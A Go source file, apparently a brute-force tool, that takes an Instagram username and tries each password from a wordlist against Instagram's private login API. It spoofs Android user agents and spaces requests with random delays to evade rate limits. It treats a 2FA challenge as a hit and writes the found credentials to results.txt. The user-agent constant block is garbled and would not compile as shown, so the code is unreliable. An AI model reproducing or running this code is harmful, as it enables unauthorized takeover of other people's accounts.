package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
	"Instagram 121.0.0.29.119 Android (29/10; 420dpi; 1080x2340; Xiaomi; MI 9; cepheus; qcom; en_US; 194678458)",
	"Instagram 150.0.0.33.120 Android (28/9.0; 440dpi; 1080x2280; Huawei; CLT-L29; HWCLT; kirin970; en_US; 212345678)",
	"Instagram 60.0.0.16.75 Android (21/5.0.1; 320dpi; 720x1280; LG; LG-D855; g3; g3; en_US; 112233445)",
	"Instagram 123.1.0.26.115 Android (30/11; 560dpi; 1440x3200; Samsung; SM-G988B; y2sxxx; exynos990; en_US; 334455667)",
	"Instagram 118.0.0.28.122 Android (27/8.1.0; 480dpi; 1080x2160; OnePlus; ONEPLUS A5010; OnePlus5T; qcom; en_US; 556677889)",
	"Instagram 105.0.0.18.119 Android (25/7.1.2; 480dpi; 1080x1920; Sony; G8141; maplemk; qcom; en_GB; 667788990)",
	"Instagram 135.0.0.28.119 Android (26/8.0.0; 320dpi; 720x1440; Nokia; TA-1046; PL2_sprout; qcom; en_US; 778899001)",
	"Instagram 84.0.0.21.214 Android (23/6.0; 320dpi; 720x1280; Motorola; XT1068; titan; qcom; en_US; 990011223)",
	"Instagram 88.0.0.14.99 Android (24/7.0; 560dpi; 1440x2560; HTC; HTC_2PS620000; htc_pmeuhl; msm8996; en_US; 112244668)",
	"Instagram 156.0.0.26.109 Android (29/10; 480dpi; 1080x2340; Oppo; CPH1917; CPH1917; qcom; en_US; 556644332)",
	"Instagram 167.0.0.24.120 Android (30/11; 400dpi; 1080x1920; Google; Pixel 2 XL; taimen; qcom; en_US; 998877665)",
	"Instagram 99.0.0.32.182 Android (26/8.0.0; 420dpi; 1080x2160; Asus; ZS620KL; ASUS_Z01RD; qcom; en_US; 776655443)",
	"Instagram 110.0.0.16.119 Android (29/10; 320dpi; 720x1280; Vivo; vivo 1610; 1610; mt6755; en_US; 445566778)",
	"Instagram 112.0.0.13.120 Android (28/9.0; 360dpi; 1080x1920; Huawei; PRA-LX1; HWPRA-H; kirin655; en_US; 112233445)",
	"Instagram 113.0.0.39.122 Android (27/8.1.0; 480dpi; 1080x2160; Lenovo; L78011; Lenovo L78011; qcom; en_US; 998877661)",
	"Instagram 90.0.0.18.118 Android (24/7.0; 640dpi; 1440x2560; Samsung; SM-G955F; dream2lte; samsungexynos8895; en_US; 365478912)",
	"Instagram 92.0.0.15.114 Android (25/7.1.1; 560dpi; 1440x2560; LG; LG-H990; h990; h990; en_US; 451236897)",
	"Instagram 80.0.0.14.110 Android (23/6.0; 320dpi; 720x1280; HTC; HTC Desire 626; htc_a32ul; mt6752; en_US; 342156789)",
	"Instagram 155.0.0.37.107 Android (30/11; 480dpi; 1080x2340; Realme; RMX1971; RMX1971; qcom; en_US; 112233991)"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-23 23:14:48"
	CURRENT_USER = "monsmain"
)

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

func main() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	for i, password := range passwords {
		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
		
		success, response := tryLogin(username, password)
		
		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
			fmt.Printf("Username: %s\n", username)
			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
			saveResult(username, password, true)
			return
		} else {
			if response.ErrorType == "bad_password" {
				fmt.Println("❌ Invalid password")
			} else if response.ErrorType == "invalid_user" {
				fmt.Println("❌ Invalid username")
				return
			} else {
				fmt.Printf("⚠️ Error: %s\n", response.Message)
			}
		}

		// افزایش فاصله زمانی بین درخواست‌ها
		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
	}

	fmt.Println("\n❌ No valid password found!")
	saveResult(username, "", false)
}

func tryLogin(username, password string) (bool, InstagramResponse) {
	loginUrl := API_URL + "accounts/login/"
	
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, InstagramResponse{}
	}

	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, InstagramResponse{}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, InstagramResponse{}
	}

	success := response.Status == "ok" || 
		   strings.Contains(string(body), "logged_in_user")

	return success, response
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := CURRENT_TIME
	var status string
	if success {
		status = "✅ SUCCESS"
	} else {
		status = "❌ FAILED"
	}
	
	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n", 
		currentTime, status, username, password)
	
	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 5 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-5) + password[len(password)-2:]
}
